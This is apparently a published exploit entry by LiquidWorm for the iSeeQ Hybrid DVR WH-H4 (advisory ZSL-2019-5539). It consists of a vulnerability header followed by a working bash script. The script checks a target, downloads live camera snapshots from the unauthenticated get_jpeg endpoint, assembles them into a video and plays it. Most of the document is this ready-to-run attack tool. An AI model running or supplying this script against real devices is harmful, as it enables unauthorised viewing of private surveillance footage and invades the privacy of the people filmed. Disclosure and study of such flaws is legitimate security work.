# Title: iSeeQ Hybrid DVR WH-H4 2.0.0.P - (get_jpeg) Stream Disclosure
# Date: 2019-10-29
# Author: LiquidWorm
# Vendor:iSeeQ
# Link: http://www.iseeq.co.kr
# CVE: N/A

#!/bin/bash
#
#
# iSeeQ Hybrid DVR WH-H4 1.03R / 2.0.0.P (get_jpeg) Stream Disclosure
#
#
# Vendor: iSeeQ
# Product web page: http://www.iseeq.co.kr
# Affected version: WH-H4 1.03R / 2.0.0.P
#
# Summary: The 4/8/16 channel hybrid standalone DVR delivers high quality
# pictures which adopts high performance video processing chips and embedded
# Linux system. This advanced video digital platform is very useful to identify
# an object from a long distance.
#
# Desc: The DVR suffers from an unauthenticated and unauthorized live stream
# disclosure when get_jpeg script is called.
#
# Tested on: Boa/0.94.13
#            PHP/7.0.22
#            DVR Web Server
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2019-5539
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5539.php
#
#
# 28.10.2019
#


if [ "$#" -ne 2 ]; then
    echo "Usage: $0 IP:PORT CHANNEL"
    exit
fi
IP=$1
CHANNEL=$2
HOST="http://$IP/cgi-bin/get_jpeg?ch=$CHANNEL"
STATUS=$(curl -Is http://$IP/cgi-bin/php/login.php 2>/dev/null | head -1 | awk -F" " '{print $2}')
if [ "$STATUS" == "404" ]; then
    echo "Target not vulnerable!"
    exit
fi
echo "Collecting snapshots..."
for x in {1..10};
    do echo -ne $x
    curl "$HOST" -o seq-$x.jpg -#;
    sleep 0.8
    done
echo -ne "\nDone."
echo -ne "\nRendering video..."
ffmpeg -t 10 -v quiet -s 352x288 -r 1 -an -i seq-%01d.jpg -c:v libx264 -vf fps=10 -pix_fmt yuvj422p clip.mp4
echo " done."
echo -ne "\nRunning animation..."
sleep 1
cvlc clip.mp4 --verbose -1 -f vlc://quit